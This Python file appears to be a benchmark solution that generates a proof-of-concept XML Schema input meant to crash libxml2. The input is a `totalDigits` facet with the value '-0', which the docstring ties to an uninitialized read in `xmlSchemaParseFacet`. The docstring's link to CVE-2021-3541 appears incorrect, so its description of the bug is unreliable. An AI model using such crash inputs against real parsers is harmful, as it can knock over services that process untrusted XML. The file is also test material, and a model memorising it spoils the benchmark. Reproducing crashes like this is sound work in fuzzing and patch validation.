class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for oss-fuzz:42536068 (CVE-2021-3541)
        in libxml2.

        The vulnerability is an uninitialized value read in the `xmlSchemaParseFacet`
        function when parsing an XML Schema Definition (XSD) file. Specifically,
        it occurs when parsing facets that expect a nonNegativeInteger, such as
        `totalDigits`.

        The PoC is based on the minimized test case from the original OSS-Fuzz
        report. It provides a `totalDigits` facet with a `value` attribute that
        starts with a negative sign (e.g., "-0"). In the vulnerable version of
        libxml2, this leads to a code path where a local variable `value` is
        read before it has been initialized, triggering a crash when compiled
        with memory sanitizers.

        This PoC constructs a minimal, well-formed XSD document that contains
        the malicious `totalDigits` facet.
        """
        poc_xml = """<?xml version="1.0"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:element name="PoC">
    <xs:simpleType>
      <xs:restriction base="xs:integer">
        <xs:totalDigits value="-0"/>
      </xs:restriction>
    </xs:simpleType>
  </xs:element>
</xs:schema>
"""
        return poc_xml.encode('utf-8')
